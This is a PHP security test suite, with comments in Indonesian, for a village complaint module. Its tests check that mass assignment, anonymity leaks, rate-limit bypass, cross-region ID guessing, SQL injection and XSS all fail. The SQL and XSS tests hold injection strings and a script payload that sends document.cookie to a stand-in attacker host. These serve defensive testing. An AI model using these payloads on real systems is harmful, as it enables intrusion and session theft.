<?php

declare(strict_types=1);

namespace Tests\Security;

use App\Auth\AccessScope;
use App\Models\AuditLog;
use App\Models\Complaint;
use App\Models\Region;
use App\Models\Role;
use App\Models\User;
use App\Services\Complaint\ComplaintService;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Testing\TestResponse;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\Attributes\TestDox;
use Tests\TestCase;

/**
 * UJI PENETRASI MODUL PENGADUAN — docs/09-testing-qa.md §4.3 & §4.5.
 *
 * Berbeda dari ComplaintPanelTest yang menguji perilaku yang DIHARAPKAN, kelas
 * ini menyerang: ia mengirim medan yang tidak ada di formulir, menebak kode
 * rahasia, dan mencoba mengubah milik orang lain. Setiap uji di sini ditulis
 * sebagai "serangan ini harus gagal", bukan "fitur ini harus jalan".
 *
 * Sasarannya adalah permukaan yang BARU ditambahkan Sprint 7 — permukaan yang
 * belum pernah dilihat siapa pun selain yang menulisnya.
 */
final class ComplaintPenetrationTest extends TestCase
{
    use DatabaseTransactions;

    private User $warga;

    private User $kasi;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seedFoundation();

        $this->warga = $this->userWithRole(Role::WARGA);
        $this->kasi = $this->userWithRole(Role::KASI_PEMERINTAHAN);
    }

    /* ======================= Penugasan massal (mass assignment) ========== */

    #[Test]
    #[TestDox('Medan istimewa yang diselundupkan ke formulir pengaduan publik diabaikan seluruhnya')]
    public function medan_istimewa_pada_formulir_publik_diabaikan(): void
    {
        $korban = $this->userWithRole(Role::WARGA);

        /*
         * Serangan: pengirim menambahkan medan yang tidak ada di formulir,
         * berharap `$guarded = ['id']` pada model meneruskannya ke basis data.
         *
         * Yang paling berbahaya ada dua. `status` + `is_published` akan
         * menerbitkan pengaduan karangan ke portal desa tanpa seorang pun
         * petugas menyentuhnya. `reporter_user_id` akan MENANAMKAN pengaduan
         * atas nama warga lain — fitnah yang tercatat sebagai laporan resmi.
         */
        $this->post('/pengaduan', [
            'category_code' => 'infrastruktur',
            'title' => 'Judul pengaduan yang sah',
            'body' => 'Isi pengaduan yang cukup panjang untuk lolos validasi minimum.',
            'status' => Complaint::STATUS_DONE,
            'is_published' => true,
            'priority' => Complaint::PRIORITY_HIGH,
            'resolution' => 'Sudah selesai, katanya.',
            'reporter_user_id' => $korban->id,
            'assigned_to' => $this->kasi->id,
            'tracking_code' => 'KODEPILIHANSENDIRI',
            'ticket_number' => 'P000000-PALSU',
            'triage_due_at' => now()->addYears(5),
            'submitted_ip_hash' => 'palsu',
        ])->assertOk();

        $pengaduan = Complaint::query()->firstOrFail();

        $this->assertSame(Complaint::STATUS_NEW, $pengaduan->status);
        $this->assertFalse($pengaduan->is_published);
        $this->assertSame(Complaint::PRIORITY_NORMAL, $pengaduan->priority);
        $this->assertNull($pengaduan->resolution);
        $this->assertNull($pengaduan->assigned_to);
        $this->assertNotSame('KODEPILIHANSENDIRI', $pengaduan->tracking_code);
        $this->assertNotSame('P000000-PALSU', $pengaduan->ticket_number);

        $this->assertNull(
            $pengaduan->reporter_user_id,
            'FITNAH: pengaduan tertanam atas nama akun lain lewat medan yang diselundupkan.'
        );
    }

    #[Test]
    #[TestDox('Medan istimewa pada rute ubah status diabaikan — hanya status & catatan yang dibaca')]
    public function medan_istimewa_pada_rute_status_diabaikan(): void
    {
        $pengaduan = $this->makeComplaint();

        $this->actingAs($this->kasi)
            ->post('/pengaduan/antrean/'.$pengaduan->id.'/status', [
                'status' => Complaint::STATUS_ACCEPTED,
                'note' => 'Diterima.',
                // Diselundupkan: menerbitkan ke portal tanpa melewati
                // pemeriksaan "hanya yang sudah selesai" di ComplaintService.
                'is_published' => true,
                'priority' => Complaint::PRIORITY_HIGH,
                'assigned_to' => $this->kasi->id,
                'reporter_user_id' => $this->warga->id,
                'is_anonymous' => true,
            ])->assertRedirect();

        $pengaduan->refresh();

        $this->assertSame(Complaint::STATUS_ACCEPTED, $pengaduan->status);
        $this->assertFalse($pengaduan->is_published, 'Terbit ke portal lewat rute ubah status.');
        $this->assertSame(Complaint::PRIORITY_NORMAL, $pengaduan->priority);
        $this->assertNull($pengaduan->assigned_to);
    }

    /* ============================ RULE-09 ================================ */

    #[Test]
    #[TestDox('Pengaduan anonim tidak dapat dibuat bernama lewat jalur mana pun')]
    public function anonim_tidak_dapat_dibuat_bernama(): void
    {
        $this->actingAs($this->warga)->post('/pengaduan', [
            'category_code' => 'infrastruktur',
            'title' => 'Dugaan pungutan liar di loket',
            'body' => 'Ada permintaan uang di luar ketentuan saat mengurus surat keterangan.',
            'is_anonymous' => true,
            'reporter_name' => 'Nama Yang Terkirim',
            'reporter_phone' => '081234567890',
        ])->assertOk();

        $pengaduan = Complaint::query()->firstOrFail();

        $this->assertTrue($pengaduan->is_anonymous);
        $this->assertNull($pengaduan->reporter_user_id);
        $this->assertNull($pengaduan->reporter_name);
        $this->assertNull($pengaduan->reporter_phone);

        /*
         * Dan tidak ada baris audit log mana pun yang menyebut pengaduan ini
         * BESERTA pelakunya — jalan pintas yang tidak dijaga CHECK constraint
         * karena yang dijaganya tabel `complaints`, bukan audit log.
         */
        $this->assertSame(0, AuditLog::query()->where('entity_id', $pengaduan->id)->count());

        $bernamaDiLog = AuditLog::query()->get()->contains(
            fn (AuditLog $l): bool => $l->actor_id !== null
                && str_contains(json_encode($l->context) ?: '', $pengaduan->ticket_number),
        );

        $this->assertFalse(
            $bernamaDiLog,
            'KEBOCORAN RULE-09: tiket pengaduan anonim tercatat bersama pelakunya.'
        );
    }

    #[Test]
    #[TestDox('Petugas tidak dapat membaca kode pelacakan lewat jalur mana pun')]
    public function kode_pelacakan_tidak_terbaca_petugas(): void
    {
        $pengaduan = $this->makeComplaint(['is_anonymous' => true]);
        $kode = $pengaduan->tracking_code;

        /*
         * Kode pelacakan adalah SATU-SATUNYA faktor pembuka pengaduan anonim.
         * Petugas yang dapat membacanya dapat membuka pengaduan anonim siapa
         * pun lewat halaman publik — dan pada pengaduan tentang perangkat
         * desa, petugas itu justru pihak yang diadukan.
         *
         * Diperiksa pada SELURUH permukaan yang menampilkan pengaduan, bukan
         * satu layar: kebocoran seperti ini masuk lewat kunci payload yang
         * tidak diduga.
         */
        foreach ([
            '/pengaduan/antrean',
            '/pengaduan/antrean/'.$pengaduan->id,
            '/dashboard',
            '/laporan',
        ] as $url) {
            $this->actingAs($this->kasi)->get($url)->assertDontSee($kode, false);
        }

        // Termasuk bagi Admin Desa, yang memegang seluruh izin.
        $admin = $this->userWithRole(Role::ADMIN_DESA);

        foreach (['/pengaduan/antrean', '/pengaduan/antrean/'.$pengaduan->id] as $url) {
            $this->actingAs($admin)->get($url)->assertDontSee($kode, false);
        }
    }

    /* ===================== Catatan internal (temuan) ===================== */

    #[Test]
    #[TestDox('TEMUAN SPRINT 7: warga tidak dapat membaca catatan internal lewat layar petugas')]
    public function catatan_internal_tidak_terbaca_pelapor(): void
    {
        $pengaduan = $this->makeComplaint();
        $scope = AccessScope::forUser($this->kasi);
        $service = app(ComplaintService::class);

        $pengaduan = $service->accept($scope, $pengaduan);
        $service->addFollowUp(
            $scope,
            $pengaduan,
            'Dugaan awal: kabel dicuri tetangga. Jangan disampaikan sebelum pasti.',
            visibleToReporter: false,
        );

        /*
         * KEBOCORAN YANG PERNAH ADA, dan inilah ujinya yang menahannya tetap
         * tertutup. Warga memegang `pengaduan.lihat`, sehingga sebelum
         * middleware `petugas` dipasang ia dapat membuka layar PETUGAS untuk
         * pengaduannya sendiri — dan layar itu menampilkan SELURUH riwayat,
         * termasuk catatan yang ditandai tidak terlihat pelapor.
         *
         * Akibatnya bukan kejanggalan tampilan: dugaan yang belum terbukti
         * tentang tetangga, yang sengaja disembunyikan di halaman pelacakan,
         * terbaca oleh orang yang paling mungkin menindaklanjutinya sendiri.
         */
        $this->actingAs($this->warga)
            ->get('/pengaduan/antrean/'.$pengaduan->id)
            ->assertForbidden();

        /*
         * Dan jalur yang memang untuk pelapor tetap bersih. Diperiksa lewat
         * pelacakan publik, bukan portal warga: portal menuntut akun yang
         * tertaut data penduduk (EnsureVerifiedCitizen), sementara yang diuji
         * di sini adalah ISI yang keluar — dan keduanya memakai muatan yang
         * sama, ComplaintPresenter::tracking().
         */
        $this->post('/pengaduan/lacak', ['tracking_code' => $pengaduan->tracking_code])
            ->assertOk()
            ->assertDontSee('kabel dicuri', false);
    }

    /* ======================== Pembatasan laju ============================ */

    #[Test]
    #[TestDox('FR-PGD-08: penebakan kode pelacakan dibatasi laju sebelum ruang terkaan tersentuh')]
    public function penebakan_kode_dibatasi_laju(): void
    {
        $this->makeComplaint();

        $ditolak = 0;

        /*
         * Kode pelacakan 16 karakter dari abjad 30 huruf ≈ 78 bit, jadi
         * penebakan murni memang mustahil. Yang diuji di sini BUKAN itu,
         * melainkan bahwa pembatasan lajunya benar-benar terpasang: tanpa
         * ia, rute ini menjadi alat yang murah untuk membanjiri server desa
         * — dan server desa tidak punya kapasitas cadangan.
         */
        for ($i = 0; $i < 12; $i++) {
            $response = $this->post('/pengaduan/lacak', [
                'tracking_code' => 'TEBAKAN'.str_pad((string) $i, 9, '0', STR_PAD_LEFT),
            ]);

            if ($response->getStatusCode() === 429) {
                $ditolak++;
            }
        }

        $this->assertGreaterThan(
            0,
            $ditolak,
            'Rute pelacakan pengaduan tidak dibatasi laju: penebakan tidak pernah dihentikan.'
        );
    }

    #[Test]
    #[TestDox('FR-PGD-08: pengiriman pengaduan beruntun dari satu IP dihentikan')]
    public function pengiriman_beruntun_dihentikan(): void
    {
        $ditolak = 0;

        for ($i = 0; $i < 8; $i++) {
            $response = $this->post('/pengaduan', [
                'category_code' => 'infrastruktur',
                'title' => 'Pengaduan beruntun nomor '.$i,
                'body' => 'Isi pengaduan yang cukup panjang untuk lolos validasi minimum.',
            ]);

            if ($response->getStatusCode() === 429) {
                $ditolak++;
            }
        }

        $this->assertGreaterThan(
            0,
            $ditolak,
            'Rute pengiriman pengaduan tidak dibatasi laju: satu skrip dapat '
            .'membanjiri kotak pengaduan desa tanpa cara menghentikannya.'
        );
    }

    /* ======================== Injeksi & masukan jahat ==================== */

    #[Test]
    #[TestDox('Pencarian antrean pengaduan tahan terhadap upaya injeksi SQL')]
    public function pencarian_tahan_injeksi(): void
    {
        $pengaduan = $this->makeComplaint();

        /*
         * KASUS KENDALI lebih dulu, dan ia bukan basa-basi: uji injeksi yang
         * memeriksa "hasilnya kosong" akan LULUS DENGAN SENDIRINYA bila cara
         * membaca hasilnya keliru dan selalu mengembalikan daftar kosong.
         * Baris ini membuktikan bahwa pembacaannya memang dapat melihat baris.
         */
        $kendali = $this->actingAs($this->kasi)
            ->get('/pengaduan/antrean?q='.urlencode('Lampu jalan'))
            ->assertOk();

        $this->assertSame(
            1,
            count($this->rows($kendali)),
            'Pembacaan hasil pencarian rusak: uji injeksi di bawah akan lulus tanpa memeriksa apa pun.'
        );
        $this->assertNotNull($pengaduan->id);

        foreach ([
            "' OR '1'='1",
            "'; DROP TABLE complaints; --",
            '%" UNION SELECT tracking_code FROM complaints --',
        ] as $muatan) {
            $response = $this->actingAs($this->kasi)
                ->get('/pengaduan/antrean?q='.urlencode($muatan));

            /*
             * Yang diuji bukan hanya "tidak 500": muatan yang lolos sebagai
             * SQL akan mengembalikan 200 DENGAN BARIS yang seharusnya tidak
             * cocok. Karena itu hasilnya harus KOSONG — tidak ada judul
             * pengaduan yang mengandung teks itu.
             */
            $response->assertOk();

            $this->assertSame(
                0,
                count($this->rows($response)),
                'Muatan injeksi "'.$muatan.'" mengembalikan baris.'
            );
        }

        // Dan tabelnya masih ada sesudahnya.
        $this->assertSame(1, Complaint::query()->count());
    }

    #[Test]
    #[TestDox('Isi pengaduan tidak dapat menanamkan skrip yang dieksekusi di layar petugas')]
    public function isi_tidak_menanamkan_skrip(): void
    {
        $jahat = '<script>fetch("https://penyerang.test?c="+document.cookie)</script>';

        $this->post('/pengaduan', [
            'category_code' => 'infrastruktur',
            'title' => 'Laporan dengan muatan '.$jahat,
            'body' => 'Isi pengaduan yang cukup panjang untuk lolos validasi minimum. '.$jahat,
        ])->assertOk();

        $pengaduan = Complaint::query()->firstOrFail();

        /*
         * Isinya memang DISIMPAN apa adanya — menyaring saat menyimpan akan
         * merusak pengaduan yang sah tentang, misalnya, nama toko ber-tanda
         * kurung sudut. Yang menjaganya adalah lapis tampilan: Vue mengikat
         * teks lewat interpolasi, bukan v-html, sehingga ia tidak pernah
         * menjadi elemen.
         *
         * Yang diuji di sini: balasan HTTP tidak pernah memuat tag <script>
         * yang hidup. Inertia menyandikan props sebagai JSON di dalam
         * atribut data-page, jadi "<" muncul sebagai <.
         */
        $isi = $this->actingAs($this->kasi)
            ->get('/pengaduan/antrean/'.$pengaduan->id)
            ->getContent() ?: '';

        $this->assertStringNotContainsString(
            '<script>fetch(',
            $isi,
            'XSS: muatan dari pengaduan warga keluar sebagai tag skrip hidup.'
        );
    }

    /* ============================== Lingkup ============================== */

    #[Test]
    #[TestDox('Kepala Dusun tidak dapat menyentuh pengaduan dusun lain lewat id yang ditebak')]
    public function id_tebakan_lintas_wilayah_ditolak(): void
    {
        $dusunLain = Region::query()->where('name', 'Dusun Sidomulyo')->firstOrFail();
        $pengaduanLain = $this->makeComplaint(['region_id' => $dusunLain->id]);

        $kadus = $this->userWithRole(
            Role::KEPALA_DUSUN,
            Region::query()->where('name', 'Dusun Krajan')->firstOrFail(),
        );

        /*
         * 404, BUKAN 403 (docs/06 §4): jawaban yang berbeda antara "tidak ada"
         * dan "ada tetapi bukan milikmu" mengubah id menjadi alat untuk
         * memetakan pengaduan di seluruh desa — satu permintaan per tebakan.
         */
        $this->actingAs($kadus)->get('/pengaduan/antrean/'.$pengaduanLain->id)->assertNotFound();

        $idPalsu = '01a00000-0000-7000-8000-000000000000';

        $this->assertSame(
            404,
            $this->actingAs($kadus)->get('/pengaduan/antrean/'.$idPalsu)->getStatusCode(),
            'Objek yang TIDAK ADA harus menjawab sama dengan objek di luar lingkup.'
        );
    }

    /* ============================== Pembantu ============================== */

    /**
     * Baris antrean dari balasan Inertia.
     *
     * @return array<array-key, mixed>
     */
    private function rows(TestResponse $response): array
    {
        /** @var array<string, mixed> $page */
        $page = $response->viewData('page');

        /** @var array<array-key, mixed> */
        return $page['props']['pengaduan']['data'] ?? [];
    }

    /** @param array<string, mixed> $attributes */
    private function makeComplaint(array $attributes = []): Complaint
    {
        $pengaduan = app(ComplaintService::class)->create(
            AccessScope::forUser($this->warga),
            [
                'category_code' => 'infrastruktur',
                'title' => 'Lampu jalan mati di RT 002',
                'body' => 'Sudah dua bulan lampu jalan di depan pos ronda mati.',
                'is_anonymous' => $attributes['is_anonymous'] ?? false,
            ],
        );

        unset($attributes['is_anonymous']);

        if ($attributes !== []) {
            $pengaduan->forceFill($attributes)->save();
        }

        return $pengaduan->refresh();
    }
}
